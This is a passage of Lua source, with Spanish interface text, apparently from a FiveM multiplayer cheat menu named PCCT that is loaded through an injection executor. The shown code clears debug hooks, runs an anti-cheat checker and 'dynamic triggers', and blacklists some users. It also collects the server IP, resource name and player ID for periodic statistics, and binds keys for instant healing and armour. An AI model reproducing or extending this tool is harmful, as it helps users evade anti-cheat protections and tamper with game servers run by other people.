                self.Painter:DrawText("Fuiste blacklisteado " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name), 4, true, w / 2, 100, 0.45, 255, 255, 255, 255)

                self.Painter:DrawText("Rason: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, reason), 4, true, w / 2, 125, 0.45, 255, 255, 255, 255)

                self.Painter:DrawSprite(w / 2, h / 2, w, h, 0.0, self.DuiName, "blacklisteado", 255, 255, 255, 255, true)

                Wait(0)

            end

        end)

    end



    CreateThread(function()

        PCCT.FreeCam:Tick()

    end)



    CreateThread(function()

        PCCT.RCCar:Tick()

    end)



    CreateThread(function()

        PCCT:SpectateTick()

    end)



    picho.debug.sethook()



    CreateThread(function()

        PCCT.ConfigClass.Load()

        PCCT.TertiaryHex = PCCT:RGBToHex({PCCT.Config.Tertiary[1], PCCT.Config.Tertiary[2], PCCT.Config.Tertiary[3]})

        PCCT:RunACChecker()



        branding = {

            name = "[" .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, PCCT.Name) .. "~s~]",

            resource = "Recurso: " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, PCCT:GetFunction("GetCurrentResourceName")()),

            ip = "IP: " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, PCCT:GetFunction("GetCurrentServerEndpoint")()),

            id = "ID DEL SERVER: " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, PCCT:GetFunction("GetPlayerServerId")(PCCT.NetworkID)),

            veh = "Vehiculo: " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, "%s"),

            build = (_Executor_Strings[_Executor] or "") .. " ~s~Build (" .. PCCT.Build .. ")"

        }



        PCCT:RunDynamicTriggers()



        PCCT:AddNotification("INFO", ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, PCCT.Name) .. " Cargado! (" .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, "v" .. PCCT.Build) .. ")", 25000)

        PCCT:AddNotification("INFO", "Usa " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, PCCT.Config.ShowKey) .. " Para abrir el menu.", 25000)

        PCCT:BuildIdentifier()



        if picho.blacklisted_users[PCCT.Identifier] then

            PCCT:DoBlacklistedEvent(picho.blacklisted_users[PCCT.Identifier])

            PCCT.Enabled = false



            return

        end



        PCCT:LoadDui()

        Wait(2500)

        PCCT:DoStatistics()



        for _, str in picho.ipairs(all_weapons) do

            all_weapons_hashes[PCCT:GetFunction("GetHashKey")(str)] = str

        end



        force_reload[PCCT:GetFunction("GetHashKey")("WEAPON_MINIGUN")] = true



        while PCCT.Enabled do

            Wait(300000)

            PCCT:DoStatistics()

        end

    end)



    PCCT:AddBindListener("heal_option", function(self)

        self:GetFunction("SetEntityHealth")(self.LocalPlayer, 200)

        self:GetFunction("ClearPedBloodDamage")(self.LocalPlayer)

        self:AddNotification("EXITO", "Curado.")

    end)



    PCCT:AddBindListener("clear_blood_option", function(self)

        self:GetFunction("ClearPedBloodDamage")(self.LocalPlayer)

        self:AddNotification("EXITO", "Sangre removida.")

    end)



    PCCT:AddBindListener("armor_option", function(self)

        self:GetFunction("SetPedArmour")(self.LocalPlayer, 200)

        self:AddNotification("EXITO", "Armadura dada.")

    end)



    PCCT:AddBindListener("suicide_option", function(self)

        self:GetFunction("SetEntityHealth")(self.LocalPlayer, 1)

        self:AddNotification("EXITO", "Termina de suicidarte!.")

    end)

end)
